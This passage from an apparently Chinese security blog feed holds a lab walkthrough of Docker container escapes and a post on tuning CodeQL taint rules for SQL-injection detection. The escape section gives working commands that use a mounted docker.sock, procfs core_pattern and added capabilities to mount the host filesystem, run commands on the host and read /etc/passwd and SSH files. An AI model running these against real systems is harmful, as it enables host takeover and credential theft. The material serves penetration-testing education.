&quot;opts&quot;: [    &quot;rw&quot;,    &quot;relatime&quot;,    &quot;bind&quot;  ]}{  &quot;device&quot;: &quot;/dev/sda5&quot;,  &quot;mountpoint&quot;: &quot;/etc/hosts&quot;,  &quot;fstype&quot;: &quot;ext4&quot;,  &quot;opts&quot;: [    &quot;rw&quot;,    &quot;relatime&quot;,    &quot;bind&quot;  ]}{  &quot;device&quot;: &quot;/dev/sda1&quot;,  &quot;mountpoint&quot;: &quot;/abc&quot;,  &quot;fstype&quot;: &quot;vfat&quot;,  &quot;opts&quot;: [    &quot;rw&quot;,    &quot;relatime&quot;  ]}2022/08/02 13:25:43 found 2 devices in total.success! device /dev/sda5 was mounted to /tmp/cdk_KBEv3success! device /dev/sda1 was mounted to /tmp/cdk_YAPBgroot@95a5e37d4649:/tmp# ls /tmp/cdk_KBEv3/bin  boot  cdrom  dev  etc  home  lib  lib32  lib64  libx32  lost+found  media  mnt  opt  proc  root  run  sbin  snap  srv  swapfile  sys  tmp  usr  var</code></pre><p>成功的挂在了宿主机的文件，逃逸了出来。后续可以通过写计划任务或者公私钥获取宿主机的权限。</p><p><img src="/img/DockerEscape/image-20220802212815323.png" alt="image-20220802212815323"></p><h2 id="0x04-Docker-sock挂载到了容器里"><a href="#0x04-Docker-sock挂载到了容器里" class="headerlink" title="0x04 Docker.sock挂载到了容器里"></a>0x04 Docker.sock挂载到了容器里</h2><h3 id="背景知识-2"><a href="#背景知识-2" class="headerlink" title="背景知识"></a>背景知识</h3><p>docker是C/S架构，输入<code>docker version</code>命令实际上是通过客户端将请求发送到同一台电脑上的Doceker Daemon服务，由Docker Daemon返回信息，客户端收到信息后展示在控制台上。</p><p><code>Doceker Daemon</code>默认监听的是<code>/var/run/docker.sock</code>这个文件，所以docker客户端只要把请求发往这里，daemon就能收到并且做出响应。也就是向<code>/var/run/docker.sock</code>发送请求，也能达到<code>docker ps</code>、<code>docker images ls</code>这样的效果。</p><h3 id="将-var-run-目录挂在到容器里"><a href="#将-var-run-目录挂在到容器里" class="headerlink" title="将/var/run/目录挂在到容器里"></a>将/var/run/目录挂在到容器里</h3><p>宿主机的<code>/var/run</code>目录下有<code>docker.sock</code>文件</p><p><img src="/img/DockerEscape/image-20211102213429685.png" alt="image-20211102213429685"></p><p>当将<code>docker.sock</code>文件所在的目录挂在到了容器里时</p><p><code>docker run -it -v /var/run/:/host/var/run/ -d --name vulhub_tomcat2 vulhub/tomcat:8.0</code></p><p><img src="/img/DockerEscape/image-20211102201605630.png" alt="image-20211102201605630"></p><h3 id="检验方法-docker-sock"><a href="#检验方法-docker-sock" class="headerlink" title="检验方法: docker.sock"></a>检验方法: docker.sock</h3><p><strong>查看当前容器里是否能找到<code>docker.sock</code></strong></p><p><code>find / -name docker.sock</code></p><p><img src="/img/DockerEscape/image-20211102213820584.png" alt="image-20211102213820584"></p><h3 id="手工利用：计划任务和公私钥-1"><a href="#手工利用：计划任务和公私钥-1" class="headerlink" title="手工利用：计划任务和公私钥"></a>手工利用：计划任务和公私钥</h3><p>既然宿主机将docker.sock挂载到了容器里，那么要在容器里先安装docker <code>apt install docker.io</code></p><p><img src="/img/DockerEscape/image-20211102213109602.png" alt="image-20211102213109602"></p><p>安装成功了</p><p><img src="/img/DockerEscape/image-20211102212954432.png" alt="image-20211102212954432"></p><p>查看宿主机Docker信息 <code>docker -H unix:///host/var/run/docker.sock info</code></p><p><img src="/img/DockerEscape/image-20211102214014112.png" alt="image-20211102214014112"></p><p>运行一个新容器并挂载宿主机根路径，可以看到容器的id变了。此时已经进入到了新的容器里。</p><p>同时在新容器/aa路径就能访问宿主机的根目录了</p><p><code>docker -H unix:///host/var/run/docker.sock run -v /:/aa -it ubuntu:14.04 /bin/bash</code></p><p><img src="/img/DockerEscape/image-20211102214316471.png" alt="image-20211102214316471"></p><p>成功的将内容写进了宿主机里</p><p><img src="/img/DockerEscape/image-20211102214512755.png" alt="image-20211102214512755"></p><p>后续同样可以写计划任务或者公私钥获取宿主机权限</p><h3 id="CDK检测和利用-1"><a href="#CDK检测和利用-1" class="headerlink" title="CDK检测和利用"></a>CDK检测和利用</h3><p><code>./cdk_linux_amd64_upx evaluate --full</code></p><p><img src="/img/DockerEscape/image-20220802214432345.png" alt="image-20220802214432345"></p><p>检测</p><pre><code>./cdk_linux_amd64_upx run docker-sock-check &lt;sock-path&gt;./cdk_linux_amd64_upx run docker-sock-check /host/var/run/docker.sock</code></pre><p><img src="/img/DockerEscape/image-20220802214541184.png" alt="image-20220802214541184"></p><p>利用</p><pre><code>./cdk_linux_amd64_upx run docker-sock-pwn &lt;sock_path&gt; &lt;shell_cmd&gt;./cdk_linux_amd64_upx run docker-sock-pwn /host/var/run/docker.sock whoami</code></pre><p><img src="/img/DockerEscape/image-20220802214611011.png" alt="image-20220802214611011"></p><p><img src="/img/DockerEscape/image-20220802214631885.png" alt="image-20220802214631885"></p><h2 id="0x05-procfs挂载到了容器里"><a href="#0x05-procfs挂载到了容器里" class="headerlink" title="0x05 procfs挂载到了容器里"></a>0x05 procfs挂载到了容器里</h2><h3 id="背景知识-3"><a href="#背景知识-3" class="headerlink" title="背景知识"></a>背景知识</h3><p>linux中的<code>/proc</code>目录是一个伪文件系统，其中动态反应着系统内进程以及其他组件的状态,其中包含许多的敏感文件，其中<code>/proc/sys/kernel/core_pattern</code>文件是负责进程奔溃时内存数据转储的，当第一个字符是<code>|</code>管道符时，后面的的部分会以命令行的方式进行解析并运行。因此，将宿主机的procfs挂载到不受控的容器中也是十分危险的，尤其是在该容器内默认启用root权限，且没有开启User Namespace时。此时就可以在挂载了procfs的容器中利用core_pattern后门实现容器逃逸。</p><h3 id="将procfs挂载到容器里"><a href="#将procfs挂载到容器里" class="headerlink" title="将procfs挂载到容器里"></a>将procfs挂载到容器里</h3><p><code>docker run -it -v /proc:/mnt/proc  -d --name vulhub_tomcat3 vulhub/tomcat:8.0</code></p><p><img src="/img/DockerEscape/image-20220803162654152.png" alt="image-20220803162654152"></p><h3 id="检验方法-proc"><a href="#检验方法-proc" class="headerlink" title="检验方法: proc"></a>检验方法: proc</h3><p>执行如下命令，如果返回的是Yes则说明当前是挂载了procfs，如果返回的是No则不是。</p><p><code>find / -name core_pattern 2&gt;/dev/null | wc -l | grep -q 2 &amp;&amp; echo &quot;Yes&quot; || echo &quot;No&quot;</code></p><p><img src="/img/DockerEscape/image-20220803162739299.png" alt="image-20220803162739299"></p><p>找到挂在的路径是<code>/mnt/proc</code></p><p><code>find / -name core_pattern</code></p><p><img src="/img/DockerEscape/image-20220803164310060.png" alt="image-20220803164310060"></p><h3 id="CDK检测和利用-2"><a href="#CDK检测和利用-2" class="headerlink" title="CDK检测和利用"></a>CDK检测和利用</h3><p><code>cdk run mount-procfs &lt;proc-dir&gt; &quot;&lt;shell-cmd&gt;&quot;</code></p><p><code>./cdk_linux_amd64_upx run mount-procfs /mnt/proc &quot;touch /tmp/test_procfs&quot;</code></p><p><img src="/img/DockerEscape/image-20220803164421323.png" alt="image-20220803164421323"></p><p>成功逃逸到宿主机</p><p><img src="/img/DockerEscape/image-20220803164444879.png" alt="image-20220803164444879"></p><h2 id="0x06-SYS-ADMIN权限滥用"><a href="#0x06-SYS-ADMIN权限滥用" class="headerlink" title="0x06 SYS_ADMIN权限滥用"></a>0x06 SYS_ADMIN权限滥用</h2><p>Rewrite Cgroup(devices.allow)管理宿主机文件</p><h3 id="背景知识-4"><a href="#背景知识-4" class="headerlink" title="背景知识"></a>背景知识</h3><p>该漏洞将宿主机cgroup目录挂载到容器内，随后劫持宿主机cgroup的<code>release_agent</code>文件，通过linux cgroup <code>notify_on_release</code>机制触发shellcode执行，完成逃逸。</p><p>重写当前容器内的 <code>/sys/fs/cgroup/devices/devices.allow</code>，逃逸特权容器访问宿主机内的文件。</p><h3 id="使用SYS-ADMIN-Linux功能运行"><a href="#使用SYS-ADMIN-Linux功能运行" class="headerlink" title="使用SYS_ADMIN Linux功能运行"></a>使用<code>SYS_ADMIN</code> Linux功能运行</h3><p>该逃逸方法<strong>不需要完全的特权模式</strong>运行容器，只需要满足：</p><ol><li>以root用户身份在容器内运行</li><li>使用<code>SYS_ADMIN</code> Linux功能运行</li><li>缺少AppArmor配置文件，否则将允许mountsyscall</li><li>cgroup v1虚拟文件系统必须以读写方式安装在容器内</li></ol><pre class="line-numbers language-text"><code class="language-text">docker run --rm -it --cap-add=SYS_ADMIN --security-opt apparmor=unconfined -d --name vulhub_tomcat4 vulhub/tomcat:8.0<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="CDK检测和利用-3"><a href="#CDK检测和利用-3" class="headerlink" title="CDK检测和利用"></a>CDK检测和利用</h3><p><code>./cdk_linux_amd64_upx evaluate --full</code></p><p><img src="/img/DockerEscape/image-20220803200010352.png" alt="image-20220803200010352"></p><pre><code>./cdk_linux_amd64_upx run rewrite-cgroup-devicesdebugfs -w cdk_mknod_resultls -l /root/.ssh</code></pre><p><img src="/img/DockerEscape/image-20220803202021530.png" alt="image-20220803202021530"></p><h2 id="0x07-CAP-DAC-READ-SEARCH权限滥用"><a href="#0x07-CAP-DAC-READ-SEARCH权限滥用" class="headerlink" title="0x07 CAP_DAC_READ_SEARCH权限滥用"></a>0x07 CAP_DAC_READ_SEARCH权限滥用</h2><h3 id="背景知识-5"><a href="#背景知识-5" class="headerlink" title="背景知识"></a>背景知识</h3><p>以root身份运行容器不是很安全，root拥有全部的权限，因此很危险，如果以非root身份运行容器那么将处处受，所以需要一种技术，能选择容器运行所需的root用户权限。</p><h3 id="靶场命令"><a href="#靶场命令" class="headerlink" title="靶场命令"></a>靶场命令</h3><p><code>docker run  -it --cap-add DAC_READ_SEARCH  -d --name vulhub_tomcat5 vulhub/tomcat:8.0</code></p><h3 id="CDK检测和利用-4"><a href="#CDK检测和利用-4" class="headerlink" title="CDK检测和利用"></a>CDK检测和利用</h3><p>检测</p><p><code>./cdk_linux_amd64_upx evaluate --full</code></p><p><img src="/img/DockerEscape/image-20220803203409115.png" alt="image-20220803203409115"></p><p>利用</p><pre><code>./cdk_linux_amd64_upx run cap-dac-read-search 文件名./cdk_linux_amd64_upx run cap-dac-read-search /etc/hosts./cdk_linux_amd64_upx run cap-dac-read-search /etc/passwd</code></pre><p><img src="/img/DockerEscape/image-20220803203536562.png" alt="image-20220803203536562"></p><p>似乎只能读文件</p><h2 id="0x08-SYS-MODULE-权限滥用"><a href="#0x08-SYS-MODULE-权限滥用" class="headerlink" title="0x08 SYS_MODULE 权限滥用"></a>0x08 SYS_MODULE 权限滥用</h2><h3 id="靶场命令-1"><a href="#靶场命令-1" class="headerlink" title="靶场命令"></a>靶场命令</h3><p><code>docker run -it --cap-add SYS_MODULE --name=docker_escape ubuntu:latest /bin/bash</code></p><h3 id="CDK检测"><a href="#CDK检测" class="headerlink" title="CDK检测"></a>CDK检测</h3><p><img src="/img/DockerEscape/image-20220803205315965.png" alt="image-20220803205315965"></p><h3 id="利用-反弹shell"><a href="#利用-反弹shell" class="headerlink" title="利用 反弹shell"></a>利用 反弹shell</h3><p>反弹shell利用文章：<a href="https://www.modb.pro/db/423144" target="_blank" rel="noopener">https://www.modb.pro/db/423144</a></p><p><img src="/img/DockerEscape/image-20220803210401456.png" alt="image-20220803210401456"></p><h2 id="0x09-SYS-PTRACE权限滥用"><a href="#0x09-SYS-PTRACE权限滥用" class="headerlink" title="0x09 SYS_PTRACE权限滥用"></a>0x09 SYS_PTRACE权限滥用</h2><h3 id="背景知识-6"><a href="#背景知识-6" class="headerlink" title="背景知识"></a>背景知识</h3><p>当容器需要调试测试时就需要添加<code>PTRACE</code>权限，我们就可以利用这一权限进行进程代码注入</p><h3 id="靶场命令-2"><a href="#靶场命令-2" class="headerlink" title="靶场命令"></a>靶场命令</h3><p><code>docker run  -it --cap-add SYS_PTRACE --pid=host --security-opt apparmor=unconfined -d --name vulhub_tomcat7 vulhub/tomcat:8.0</code></p><h3 id="手工利用"><a href="#手工利用" class="headerlink" title="手工利用"></a>手工利用</h3><p>通过shellcode获取权限</p><p><a href="https://www.modb.pro/db/423144" target="_blank" rel="noopener">https://www.modb.pro/db/423144</a></p><p><img src="/img/DockerEscape/image-20220803210326829.png" alt="image-20220803210326829"></p><h3 id="CDK检测-1"><a href="#CDK检测-1" class="headerlink" title="CDK检测"></a>CDK检测</h3><p><img src="/img/DockerEscape/image-20220803205924980.png" alt="image-20220803205924980"></p><p><code>./cdk_linux_amd64_upx run check-ptrace</code></p><p><img src="/img/DockerEscape/image-20220803210111945.png" alt="image-20220803210111945"></p><h2 id="0x10-lxcfs"><a href="#0x10-lxcfs" class="headerlink" title="0x10 lxcfs"></a>0x10 lxcfs</h2><h3 id="背景知识-7"><a href="#背景知识-7" class="headerlink" title="背景知识"></a>背景知识</h3><p>首先简单介绍一下<code>lxcfs</code>，<strong>lxcfs 是一个开源的 FUSE（用户态文件系统）实现来支持 LXC 容器，它也可以支持 Docker 容器。让容器内的应用在读取内存和 CPU 信息的时候通过 lxcfs 的映射，转到自己的通过对 cgroup 中容器相关定义信息读取的虚拟数据上</strong></p><p>首先在宿主机上安装<code>lxcfs</code>，修改<code>/var/lib/lxcfs</code>权限</p><pre><code>apt install lxcfslxcfs /var/lib/lxcfs</code></pre><p><img src="/img/DockerEscape/image-20220803211318487.png" alt="image-20220803211318487"></p><h3 id="靶场命令-3"><a href="#靶场命令-3" class="headerlink" title="靶场命令"></a>靶场命令</h3><p><code>docker run  -it -v /var/lib/lxcfs/:/test/lxcfs -d --name vulhub_tomcat8 vulhub/tomcat:8.0</code></p><h3 id="CDK检测和利用-5"><a href="#CDK检测和利用-5" class="headerlink" title="CDK检测和利用"></a>CDK检测和利用</h3><p><img src="/img/DockerEscape/image-20220803211438588.png" alt="image-20220803211438588"></p><pre><code>./cdk_linux_amd64_upx run lxcfs-rwdebugfs -w host_dev</code></pre><p><img src="/img/DockerEscape/image-20220803211556701.png" alt="image-20220803211556701"></p><h2 id="0x11-参考链接"><a href="#0x11-参考链接" class="headerlink" title="0x11 参考链接"></a>0x11 参考链接</h2><pre><code>https://www.anquanke.com/post/id/179623https://www.cnblogs.com/xiaozi/p/13423853.htmlhttps://www.cdxy.me/?p=840https://www.modb.pro/db/423145https://www.modb.pro/db/423144</code></pre>]]></content>
      
      
      <categories>
          
          <category> Docker </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Docker逃逸 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CodeQL系列之域敏感和兜底规则冲突的解决过程</title>
      <link href="/2022/07/21/codeql-xi-lie-zhi-yu-min-gan-he-dou-di-gui-ze-de-chong-tu-jie-jue-fang-an/"/>
      <url>/2022/07/21/codeql-xi-lie-zhi-yu-min-gan-he-dou-di-gui-ze-de-chong-tu-jie-jue-fang-an/</url>
      
        <content type="html"><![CDATA[<h1 id="CodeQL系列之域敏感和兜底规则冲突的解决过程"><a href="#CodeQL系列之域敏感和兜底规则冲突的解决过程" class="headerlink" title="CodeQL系列之域敏感和兜底规则冲突的解决过程"></a>CodeQL系列之域敏感和兜底规则冲突的解决过程</h1><p><strong>效果: 检测SQL注入漏洞准确率达到90%以上，几乎无误报漏报。</strong></p><h2 id="0x01-问题"><a href="#0x01-问题" class="headerlink" title="0x01 问题"></a>0x01 问题</h2><p>起初isAdditionalTaintStep的污染转播链规则是将所有情况都标记为污染。目的是为了避免漏报的情况发生。</p><p><img src="/img/CodeQLDomainSensitiveSQL/image-20220708151742789.png" alt="image-20220708151742789"></p><p>例如：此种情况下CodeQL默认的TaintStep不会扫出链路，加了兜底规则后则会扫出该链路。</p><p><img src="/img/CodeQLDomainSensitiveSQL/image-20220708152117102.png" alt="image-20220708152117102"></p><p>但是因为兜底规则将所有的情况都标记为了污染，那么也会出现误报的情况。</p><p>例如：模拟XML的SQL注入漏洞情况，在XML文件里，直接是获取对象的属性然后执行sql语句，而在触发SQL语句的入口点却传入的是对象。如下例子vul11testExec，souce传递进来后赋值给dsUser的cmd属性，然后dsUser的user属性赋值为常量，最后将整个对象dsUser传递给执行SQL语句的函数，在xml里的sql语句可能是select cmd from table或者是select user from table。那么当sql语句里是cmd属性时，那么是存在漏洞的，如果是user属性时，则不存在漏洞。但是因为兜底规则的影响，将dsUser整个对象标记为了污染，因此无论xml里的sql语句是cmd属性还是user属性，都会认为该链路存在SQL注入漏洞。这样就造成了误报。</p><p><img src="/img/CodeQLDomainSensitiveSQL/image-20220708152338938.png" alt="image-20220708152338938"></p><h2 id="0x02-解决过程"><a href="#0x02-解决过程" class="headerlink" title="0x02 解决过程"></a>0x02 解决过程</h2><h3 id="0x02-1-方案1（解决了部分误报）"><a href="#0x02-1-方案1（解决了部分误报）" class="headerlink" title="0x02-1 方案1（解决了部分误报）"></a>0x02-1 方案1（解决了部分误报）</h3><p>链路中出现getXXX、setXXX时，不走兜底规则，走CodeQL默认的链路，这样就不会因为当出现setXXX赋值的语句时，将整个对象标记为污染，从而解决了部分误报漏报的情况。</p><h4 id="第一次优化"><a href="#第一次优化" class="headerlink" title="第一次优化"></a>第一次优化</h4><p>isAdditionalTaintStep只有兜底规则</p><p><img src="/img/CodeQLDomainSensitiveSQL/image-20220711204819242.png" alt="image-20220711204819242"></p><p>则会出现如下的误报，因为在<code>dstest.setCmd(cmd);</code>中，node1是cmd，node2是dstest，将对象dstest标记为污染了。所以最终能够扫出下面的误报链路。</p><p><img src="/img/CodeQLDomainSensitiveSQL/image-20220711204722358.png" alt="image-20220711204722358"></p><p><strong>解决方案：CodeQL默认是会处理域敏感问题，那么当链路中出现了setXXX、getXXX方法时，不让走我们定义的兜底规则，走CodeQL默认的域敏感处理规则，那么就会将dstest的cmd属性标记为污染，不会将整个dstest对象标记污染，因此解决该误报链路问题。</strong></p><p>在<code>isAdditionalTaintStep</code>方法里，通过if判断条件，如果链路中存在setXXX、getXXX方法，那么执行none语句，即不走兜底规则，走CodeQL默认的域敏感处理规则。可以看到结果里没有了getUsername这条链路了。的确解决了误报问题。</p><p><img src="/img/CodeQLDomainSensitiveSQL/image-20220711205217191.png" alt="image-20220711205217191"></p><h4 id="第二次优化"><a href="#第二次优化" class="headerlink" title="第二次优化"></a>第二次优化</h4><p>但是发现该if判断条件较简单粗暴，是直接粗暴的将所有setXXX、getXXX方法都走默认的CodeQL规则,但是没有将其和node1、node2连接起来。</p><p>忘记当时的场景是什么状况了，反正要优化下，将node1和node2连接起来。</p><p><img src="/img/CodeQLDomainSensitiveSQL/image-20220711213340269.png" alt="image-20220711213340269"></p><h4 id="第三次优化"><a href="#第三次优化" class="headerlink" title="第三次优化"></a>第三次优化</h4><p>后面又发现一处bug，通过下面的if判断条件，居然扫出了一条误报链路</p><p>误报情况如下，dstest对象仍然被标记为污染</p><p><img src="/img/CodeQLDomainSensitiveSQL/8b6ddf1bcdd2f81fc461c33e9ad8aac041479e20.png" alt="8b6ddf1bcdd2f81fc461c33e9ad8aac041479e20"></p><p>解决方案：isAdditionalTaintStep里Method m起初放在最外层的exists中，会出现dstest.setUsername(“zhangsan”);的误报链路，将Method m移到if判断语句里，解决了该误报问题。</p><p><img src="/img/CodeQLDomainSensitiveSQL/5922b5fd611140cd7d82c551b2074650961e989f.png" alt="5922b5fd611140cd7d82c551b2074650961e989f"></p><p>优化后如下</p><p><img src="/img/CodeQLDomainSensitiveSQL/d5447e44cdf6e812a9cc32fe20578eb453c89df9.png" alt="d5447e44cdf6e812a9cc32fe20578eb453c89df9"></p><p>解决了误报问题。</p><h4 id="第四次优化"><a href="#第四次优化" class="headerlink" title="第四次优化"></a>第四次优化</h4><p>下图红框走了兜底规则，将dsUser对象标记为污染。</p><p><img src="/img/CodeQLDomainSensitiveSQL/image-20220711213556190.png" alt="image-20220711213556190"></p><p>解决方案：实例化对象的时候，不走兜底规则，走codeql默认的TaintStep，则添加一条规则，判断call是不是实例化。即下图红框里的代码。</p><p>优化后如下，成功解决了上面的误报问题。</p><p><img src="/img/CodeQLDomainSensitiveSQL/image-20220711213711929.png" alt="image-20220711213711929"></p><h4 id="最终规则"><a href="#最终规则" class="headerlink" title="最终规则"></a>最终规则</h4><p>优化后代码如下：</p><pre class="line-numbers language-java"><code class="language-java"><span class="token comment" spellcheck="true">// 链路里的所有可能污染的地方</span>  override predicate <span class="token function">isAdditionalTaintStep</span><span class="token punctuation">(</span>DataFlow<span class="token operator">:</span><span class="token operator">:</span>Node node1<span class="token punctuation">,</span> DataFlow<span class="token operator">:</span><span class="token operator">:</span>Node node2<span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token function">exists</span><span class="token punctuation">(</span>Call call<span class="token punctuation">,</span> Callable callable <span class="token operator">|</span>       <span class="token comment" spellcheck="true">// storeStep(src, c, sink) and</span>      call<span class="token punctuation">.</span><span class="token function">getCallee</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=</span> callable and      <span class="token keyword">if</span> <span class="token function">exists</span><span class="token punctuation">(</span>Method m <span class="token operator">|</span>           <span class="token comment" spellcheck="true">// 如果是object.setXXXXXX(YYYYYY)时，则走codeql默认的TaintStep，这样只会污染object的XXXXXX属性，不会将整个对象污染</span>          <span class="token punctuation">(</span>            node1<span class="token punctuation">.</span><span class="token function">asExpr</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=</span> call<span class="token punctuation">.</span><span class="token function">getAnArgument</span><span class="token punctuation">(</span><span class="token punctuation">)</span> and            node2<span class="token punctuation">.</span><span class="token function">asExpr</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=</span> call<span class="token punctuation">.</span><span class="token function">getQualifier</span><span class="token punctuation">(</span><span class="token punctuation">)</span> and            m <span class="token operator">=</span> call<span class="token punctuation">.</span><span class="token function">getCallee</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token function">and</span>            <span class="token punctuation">(</span>              m <span class="token keyword">instanceof</span> <span class="token class-name">SetterMethod</span> or              m <span class="token keyword">instanceof</span> <span class="token class-name">GetterMethod</span>            <span class="token punctuation">)</span>          <span class="token punctuation">)</span>          <span class="token comment" spellcheck="true">// 如果是DSUser dsUser = new DSUser(command)时，则走codeql默认的TaintStep</span>          <span class="token function">or</span>          <span class="token punctuation">(</span>            node1<span class="token punctuation">.</span><span class="token function">asExpr</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=</span> call<span class="token punctuation">.</span><span class="token function">getAnArgument</span><span class="token punctuation">(</span><span class="token punctuation">)</span> and            node2<span class="token punctuation">.</span><span class="token function">asExpr</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=</span> call and            call <span class="token keyword">instanceof</span> <span class="token class-name">ConstructorCall</span>          <span class="token punctuation">)</span>         <span class="token punctuation">)</span>      then          <span class="token function">none</span><span class="token punctuation">(</span><span class="token punctuation">)</span>      <span class="token keyword">else</span>          <span class="token comment" spellcheck="true">// none()</span>        <span class="token comment" spellcheck="true">// 兜底函数，避免漏报</span>        <span class="token punctuation">(</span>          <span class="token punctuation">(</span>            node1<span class="token punctuation">.</span><span class="token function">asExpr</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=</span> call<span class="token punctuation">.</span><span class="token function">getAnArgument</span><span class="token punctuation">(</span><span class="token punctuation">)</span> or             node1<span class="token punctuation">.</span><span class="token function">asExpr</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=</span> call<span class="token punctuation">.</span><span class="token function">getQualifier</span><span class="token punctuation">(</span><span class="token punctuation">)</span>           <span class="token punctuation">)</span> <span class="token function">and</span>           <span class="token punctuation">(</span>            node2<span class="token punctuation">.</span><span class="token function">asExpr</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=</span> call or            node2<span class="token punctuation">.</span><span class="token function">asExpr</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=</span> call<span class="token punctuation">.</span><span class="token function">getQualifier</span><span class="token punctuation">(</span><span class="token punctuation">)</span>          <span class="token punctuation">)</span>        <span class="token punctuation">)</span>     <span class="token punctuation">)</span>  <span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="0x02-2-方案2（最终解决思路可行，方式错误）"><a href="#0x02-2-方案2（最终解决思路可行，方式错误）" class="headerlink" title="0x02-2 方案2（最终解决思路可行，方式错误）"></a>0x02-2 方案2（最终解决思路可行，方式错误）</h3><p>在XML格式的SQL注入里，例如selectByExample函数的orderByClause注入，sink点是example对象，而xml文件里直接是调用了orderByClause属性，并没有通过getXXX方法获取orderByClause值，因此前面的通过过滤getXXX方法走CodeQL默认的规则并不适用。分析CodeQL展现结果的链路，发现当对象的属性被污染时，展现的是dsUser [cmd]:String类似的格式，即dsUser对象的cmd属性被污染。<strong>因此想到的解决方案是获取最后sink点的污染属性名字，再和xml文件里的注入点名字做对比</strong>。从而解决误报问题。</p><h4 id="跟踪CodeQL默认的污染传播链路"><a href="#跟踪CodeQL默认的污染传播链路" class="headerlink" title="跟踪CodeQL默认的污染传播链路"></a>跟踪CodeQL默认的污染传播链路</h4><p>为了读取Sink点的污染属性，起初想到的是寻找方法能够读取最后sink点被污染的属性（最终证实该方法并不可行，因为当sink是对象的链路打印出来后，其实整个对象就已经被标记为污染了，那么就不可能打印出被污染的属性，但是当时没有想到这一点）。于是一步步的分析跟踪CodeQL默认的污染传播链路。</p><p><strong><code>TaintTracking::Configuration#isAdditionalFlowStep</code>方法入口开始分析</strong></p><p>发现<code>isAdditionalFlowStep</code>方法里调用了<code>isAdditionalTaintStep</code>（我们自写的污染转播规则）和<code>defaultAdditionalTaintStep</code>（CodeQL默认的污点传播规则）</p><p><img src="/img/CodeQLDomainSensitiveSQL/image-20220708155345397.png" alt="image-20220708155345397"></p><p>跟入到<code>defaultAdditionalTaintStep</code>（CodeQL默认的污点传播规则）里</p><p><img src="/img/CodeQLDomainSensitiveSQL/image-20220708155633318.png" alt="image-20220708155633318"></p><p>后面一顿分析</p><p><img src="/img/CodeQLDomainSensitiveSQL/image-20220708161047400.png" alt="image-20220708161047400"></p><h4 id="分析PathNode节点"><a href="#分析PathNode节点" class="headerlink" title="分析PathNode节点"></a>分析PathNode节点</h4><p><strong>PathNode入口开始分析</strong></p><p>发现了<code>PathNodeImpl</code>类，该类继承于<code>PathNode</code></p><p><img src="/img/CodeQLDomainSensitiveSQL/image-20220708161255114.png" alt="image-20220708161255114"></p><p>看了下所有的方法，发现了<code>toString</code>方法，猜测可能是通过该方法打印每条链路里的每一节点信息。于是继续深入跟踪测试。</p><p>更改了原先的<code>toString</code>方法里的内容，添加了一下<code>---</code>字符串做测试，发现的确影响到了链路里的每一个节点的内容。</p><p><img src="/img/CodeQLDomainSensitiveSQL/image-20220708161417531.png" alt="image-20220708161417531"></p><p>跟入<code>this.ppAp()</code>方法里，发现如果节点PathNode是PathNodeSink时，则返回空，如果节点PathNode是PathNodeMid时，返回getAp()方法的结果。</p><p><img src="/img/CodeQLDomainSensitiveSQL/image-20220708163903532.png" alt="image-20220708163903532"></p><p>那么PathNodeSink和PathNodeMid的区别是什么？在toString方法里，添加打印this.getAQlClass()方法</p><p><img src="/img/CodeQLDomainSensitiveSQL/image-20220708164109822.png" alt="image-20220708164109822"></p><p>从结果中可以分析出来，PathNodeSink是链路中最后的一个节点，PathNodeMid是链路中的每个过程的中间节点</p><p><img src="/img/CodeQLDomainSensitiveSQL/image-20220708164242863.png" alt="image-20220708164242863"></p><p>接下来分析PathNodeMid的getAp()方法返回了什么内容，通过PathNodeMid的定义知道，getAp()返回了AccessPath对象。</p><p><img src="/img/CodeQLDomainSensitiveSQL/image-20220708164409004.png" alt="image-20220708164409004"></p><p>继续跟入分析AccessPath类，通过介绍猜测是链路中的每条路径里的信息</p><p><img src="/img/CodeQLDomainSensitiveSQL/image-20220708164759222.png" alt="image-20220708164759222"></p><p>继续分析发现不少类继承了AccessPath类，通过一个个测试发现AccessPathCons类的toString()方法会影响到我们结果的内容</p><p><img src="/img/CodeQLDomainSensitiveSQL/image-20220708164653390.png" alt="image-20220708164653390"></p><p><img src="/img/CodeQLDomainSensitiveSQL/image-20220708165911028.png" alt="image-20220708165911028"></p><p>继续跟入到<code>AccessPathCons#toStringImpl()</code>方法里，红框里的内容就是展示结果里打印的内容。</p><p><img src="/img/CodeQLDomainSensitiveSQL/image-20220708165957056.png" alt="image-20220708165957056"></p><p>有意思的地方是<code>head.toSting()</code>，该方法打印了对象被污染了的属性。于是分析下head的类<code>TypedContent</code></p><p><img src="/img/CodeQLDomainSensitiveSQL/image-20220708170119931.png" alt="image-20220708170119931"></p><p>类<code>TypedContent</code></p><p><img src="/img/CodeQLDomainSensitiveSQL/image-20220708170140420.png" alt="image-20220708170140420"></p><p>执行<code>TypedContent#toString()</code>方法，发现打印的结果均是对象的属性。</p><p><img src="/img/CodeQLDomainSensitiveSQL/image-20220708170229912.png" alt="image-20220708170229912"></p><p>那么就能理解了为什么<code>AccessPathCons#toStringImpl()</code>里的<code>head.toSting()</code>能够将对象里被污染的属性打印出来了。</p><p>将打印污染属性的中括号里加上*测试效果</p><p><img src="/img/CodeQLDomainSensitiveSQL/image-20220708170640172.png" alt="image-20220708170640172"></p><p><img src="/img/CodeQLDomainSensitiveSQL/image-20220708170718953.png" alt="image-20220708170718953"></p><p>效果如下：的确将source传递给dstest对象的cmd属性污染了，在链路中打印出了[*cmd*]</p><p><img 